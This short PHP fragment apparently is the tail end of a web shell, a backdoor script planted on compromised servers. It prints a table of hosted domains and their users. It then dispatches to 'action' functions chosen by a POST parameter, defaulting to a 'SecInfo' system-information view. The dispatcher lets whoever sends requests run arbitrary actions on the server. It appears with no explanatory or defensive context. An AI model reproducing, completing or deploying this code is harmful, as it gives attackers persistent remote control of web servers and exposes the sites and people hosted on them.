echo "<tr><td>".$count++."</td><td><a href='http://".$domain."' target='_blank'>".$domain."</a></td><td>".$user['name']."</td></tr>";
 }
}
 printFooter();
}
if( empty($_POST['a']) )
if(isset($default_action) && function_exists('action' . $default_action))
$_POST['a'] = $default_action;
else
$_POST['a'] = 'SecInfo';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
call_user_func('action' . $_POST['a'])
?>
